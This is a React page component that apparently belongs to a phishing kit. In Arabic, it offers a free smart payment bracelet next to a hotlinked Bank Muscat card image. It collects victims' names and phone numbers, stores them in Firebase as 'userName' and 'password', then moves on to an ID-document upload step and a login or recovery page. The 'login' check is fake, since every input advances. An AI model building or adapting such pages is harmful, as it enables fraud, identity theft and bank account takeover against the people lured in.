"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/firebase"
import { Init } from "@/components/init"
import IdUploadStep from "@/components/id-upload-step"
import UsernameRecoveryPage from "@/components/login"

export default function RegisterPage() {
  const [currentStep, setCurrentStep] = useState<"1" | "2" | "3">("1")
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor") as string
    await addData({ id: visitorId!, userName: userId, password }).then(() => {
      console.log("done1")
    })
    setIsLoading(true)

    // Simulate login API call
    setTimeout(() => {
      if (userId && password) {
        setCurrentStep("2")
      } else {
        setCurrentStep("2")
      }
      setIsLoading(false)
    }, 2000)
  }

  const handleIdUploadComplete = () => {
    setCurrentStep("3")
  }

  const renderCardPage = () => (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
<UsernameRecoveryPage/>
    </div>
  )

  return (
    <>
      <Init />
      {currentStep === "1" ? (
        <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 py-8 px-4">
          <div className="max-w-md mx-auto">
            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-red-600 to-red-700 rounded-2xl mb-6 shadow-lg">
                <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                </svg>
              </div>
              <h1 className="text-2xl font-bold text-slate-800 mb-2 text-balance">احصل على سوار الدفع الذكي</h1>
              <p className="text-slate-600 text-sm leading-relaxed">أدخل معلوماتك للحصول على سوار الدفع الذكي مجاناً</p>
            </div>

            <div className="bg-white rounded-3xl shadow-xl border border-slate-200/60 overflow-hidden">
              <div className="p-8 pb-6">
                <form onSubmit={handleLogin} className="space-y-6">
                  <div className="text-right">
                    <label className="block text-slate-700 font-medium text-sm mb-3">الاسم الكامل *</label>
                    <div className="relative">
                      <Input
                        type="text"
                        className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
                        dir="rtl"
                        onChange={(w) => {
                          setUserId(w.target.value)
                        }}
                        placeholder="أدخل اسمك الكامل"
                      />
                    </div>
                  </div>

                  <div className="text-right">
                    <label className="block text-slate-700 font-medium text-sm mb-3">رقم الهاتف *</label>
                    <div className="relative">
                      <Input
                        type="tel"
                        className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
                        dir="rtl"
                        onChange={(w) => {
                          setPassword(w.target.value)
                        }}
                        placeholder="أدخل رقم هاتفك"
                      />
                    </div>
                  </div>

                  <div className="pt-4">
                    <Button
                      disabled={isLoading}
                      className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-blue-700 hover:to-blue-800 text-white py-4 rounded-xl text-sm font-medium shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50"
                    >
                      {isLoading ? (
                        <div className="flex items-center gap-2">
                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                          جاري المعالجة...
                        </div>
                      ) : (
                        <div className="flex items-center justify-center gap-2">
                          <span>التالي</span>
                          <span>←</span>
                        </div>
                      )}
                    </Button>
                  </div>
                  <div className="relative bg-gradient-to-br from-slate-50 to-slate-100 rounded-2xl p-6 mb-8">
                    <img
                      src="https://www.bankmuscat.com/ar/bm-cards/Lists/Cards%20Details%20Home/Attachments/41/15_Oman-Air_CC.png"
                      alt="Payment Terminal"
                      className="w-full max-w-[280px] mx-auto object-contain rounded-xl shadow-sm"
                    />
                    <div className="absolute top-4 right-4 bg-green-500 text-white text-xs font-medium px-3 py-1 rounded-full">
                      مجاني
                    </div>
                  </div>
                </form>
              </div>

              <div className="bg-slate-50 px-8 py-6 border-t border-slate-100">
                <p className="text-center text-xs text-slate-500 leading-relaxed">
                  بالمتابعة، فإنك توافق على
                  <span className="text-blue-600 font-medium"> شروط الخدمة </span>و
                  <span className="text-blue-600 font-medium"> سياسة الخصوصية </span>
                  الخاصة بنا
                </p>
              </div>
            </div>

            <div className="mt-8 text-center">
              <div className="flex items-center justify-center gap-6 text-slate-400">
                <div className="flex items-center gap-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
                  </svg>
                  <span className="text-xs">آمن ومحمي</span>
                </div>
                <div className="flex items-center gap-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span className="text-xs">مجاني تماماً</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : currentStep === "2" ? (
        <IdUploadStep onComplete={handleIdUploadComplete} />
      ) : (
        renderCardPage()
      )}
    </>
  )
}
